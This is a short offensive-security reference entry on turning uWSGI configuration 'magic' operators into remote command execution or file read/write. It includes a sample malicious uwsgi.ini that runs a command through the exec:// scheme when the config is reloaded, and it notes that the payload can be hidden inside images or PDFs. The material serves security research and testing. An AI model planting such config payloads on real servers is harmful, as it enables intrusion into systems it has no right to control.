# uWSGI configuration file

uWSGI configuration files can include “magic” variables, placeholders and operators defined with a precise syntax. The ‘@’ operator in particular is used in the form of @(filename) to include the contents of a file. Many uWSGI schemes are supported, including “exec” - useful to read from a process’s standard output. These operators can be weaponized for Remote Command Execution or Arbitrary File Write/Read when a .ini configuration file is parsed:

Example of malicious uwsgi.ini file:

```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; call a function returning a char *
characters = @(call://uwsgi_func)
```

When the configuration file will be parsed(e.g. restart, crash or autoreload) payload will be executed.

## uWSGI lax parsing

The uWSGI parsing of configuration file is lax. The previous payload can be embedded inside a binary file(e.g. image, pdf, ...). 

## Thanks to

* [A New Vector For “Dirty” Arbitrary File Write to RCE - Doyensec - Maxence Schmitt and Lorenzo Stella](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)

